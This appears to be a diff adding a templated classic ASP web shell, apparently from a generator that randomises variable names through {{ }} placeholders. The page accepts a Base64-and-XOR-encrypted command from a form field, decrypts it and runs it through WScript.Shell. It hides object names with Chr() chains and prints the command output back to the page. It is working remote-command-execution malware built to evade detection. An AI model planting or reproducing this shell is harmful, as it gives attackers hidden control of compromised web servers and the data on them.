@@ -1,0 +1,116 @@
+<%
+If Request.Form("{{ encryptedInput }}") <> "" Then
+    Dim {{ encryptedCommand }}, {{ decryptedCommand }}
+    Dim {{ objShell }}, {{ objExecObject }}, {{ strOutput }}
+    Dim {{ keyString }}, {{ tempDecodedString }}    
+    Dim {{ cmd_Decrypted }}, {{ WScript_Shell_Decrypted }}
+
+    {{ keyString }} = "{{ encryption_key }}"
+    {{ tempDecodedString }} = {{ Base64Decode }}("{{ cmd }}")
+    {{ cmd_Decrypted }} = {{ XORStrings }}({{ tempDecodedString }}, {{ keyString }})
+    {{ tempDecodedString }} = {{ Base64Decode }}("{{ WScript_Shell }}")
+    {{ WScript_Shell_Decrypted }} = {{ XORStrings }}({{ tempDecodedString }}, {{ keyString }})
+
+    Function {{ Base64Encode }}({{ strText }})
+        Dim {{ objXML }}, {{ objNode }}
+        Set {{ objXML }} = CreateObject(Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(68) & Chr(79) & Chr(77) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116))
+        Set {{ objNode }} = {{ objXML }}.createElement(Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52))
+        {{ objNode }}.dataType = Chr(98) & Chr(105) & Chr(110) & Chr(46) & Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52)
+        {{ objNode }}.nodeTypedValue = {{ StringToBinary }}({{ strText }})
+        {{ Base64Encode }} = {{ objNode }}.text
+        Set {{ objNode }} = Nothing
+        Set {{ objXML }} = Nothing
+    End Function
+
+    Function {{ StringToBinary }}({{ strText }})
+        Dim arrData
+        arrData = {{ MultiByteToBinary }}({{ strText }})
+        {{ StringToBinary }} = arrData
+    End Function
+
+    Function {{ MultiByteToBinary }}({{ strText }})
+        Dim {{ stream }}
+        Set {{ stream }} = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(83) & Chr(116) & Chr(114) & Chr(101) & Chr(97) & Chr(109))
+        {{ stream }}.Type = 2
+        {{ stream }}.Charset = Chr(105) & Chr(115) & Chr(111) & Chr(45) & Chr(56) & Chr(56) & Chr(53) & Chr(57) & Chr(45) & Chr(49)
+        {{ stream }}.Open
+        {{ stream }}.WriteText {{ strText }}
+        {{ stream }}.Position = 0
+        {{ stream }}.Type = 1
+        {{ MultiByteToBinary }} = {{ stream }}.Read
+        {{ stream }}.Close
+        Set {{ stream }} = Nothing
+    End Function
+
+    Function {{ Base64Decode }}({{ strText }})
+        Dim {{ objXML }}, {{ objNode }}
+        Set {{ objXML }} = CreateObject(Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(68) & Chr(79) & Chr(77) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116))
+        Set {{ objNode }} = {{ objXML }}.createElement(Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52))
+        {{ objNode }}.dataType = Chr(98) & Chr(105) & Chr(110) & Chr(46) & Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52)
+        {{ objNode }}.text = {{ strText }}
+        {{ Base64Decode }} = {{ BinaryToString }}({{ objNode }}.nodeTypedValue)
+        Set {{ objNode }} = Nothing
+        Set {{ objXML }} = Nothing
+    End Function
+
+    Function {{ BinaryToString }}({{ binaryVal }})
+        Dim {{ objStream }}
+        Set {{ objStream }} = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(83) & Chr(116) & Chr(114) & Chr(101) & Chr(97) & Chr(109))
+        {{ objStream }}.Type = 1
+        {{ objStream }}.Open
+        {{ objStream }}.Write {{ binaryVal }}
+        {{ objStream }}.Position = 0
+        {{ objStream }}.Type = 2
+        {{ objStream }}.Charset = Chr(105) & Chr(115) & Chr(111) & Chr(45) & Chr(56) & Chr(56) & Chr(53) & Chr(57) & Chr(45) & Chr(49)
+        {{ BinaryToString }} = {{ objStream }}.ReadText
+        {{ objStream }}.Close
+        Set {{ objStream }} = Nothing
+    End Function
+
+    Function {{ XORStrings }}({{ input1 }}, {{ input2 }})
+        Dim {{ result }}
+        Dim {{ iterator }}
+        Dim {{ char1 }}, {{ char2 }}, {{ xorValue }}
+        {{ result }} = ""
+        For {{ iterator }} = 1 To Len({{ input1 }})
+            {{ char1 }} = Asc(Mid({{ input1 }}, {{ iterator }}, 1))
+            {{ char2 }} = Asc(Mid({{ input2 }}, ({{ iterator }} - 1) Mod Len({{ input2 }}) + 1, 1))
+
+            {{ xorValue }} = {{ char1 }} Xor {{ char2 }}
+
+            {{ result }} = {{ result }} & Chr({{ xorValue }})
+        Next
+        {{ XORStrings }} = {{ result }}
+    End Function
+
+    {{ encryptedCommand }} = Request.Form("{{ encryptedInput }}")
+    {{ base64DecodedCommand }} = {{ Base64Decode }}({{ encryptedCommand }})
+    {{ decryptedCommand }} = {{ XORStrings }}({{ base64DecodedCommand }}, {{ keyString }})
+
+    Set {{ objShell }} = CreateObject({{ WScript_Shell_Decrypted }})
+    Set {{ objExecObject }} = {{ objShell }}.Exec({{ cmd_Decrypted }} & {{ decryptedCommand }})
+
+    {{ strOutput }} = {{ objExecObject }}.StdOut.ReadAll()
+
+    Set {{ objExecObject }} = Nothing
+    Set {{ objShell }} = Nothing
+End If
+%>
+
+<html>
+<head>
+    <title>{{ Execute_Command }}</title>
+</head>
+<body>
+    <h2>{{ Execute_Encrypted_Command }}</h2>
+    <form method="post">
+        <label for="{{ encryptedInput }}">{{ Enter_Encrypted_Command }}</label><br>
+        <input type="text" id="{{ encryptedInput }}" name="{{ encryptedInput }}" size="60"><br><br>
+        <input type="submit" value="{{ SubmitValue }}">
+    </form>
+
+    <% If Request.Form("{{ encryptedInput }}") <> "" Then %>        
+        <pre><%={{ strOutput }}%></pre>
+    <% End If %>
+</body>
+</html>
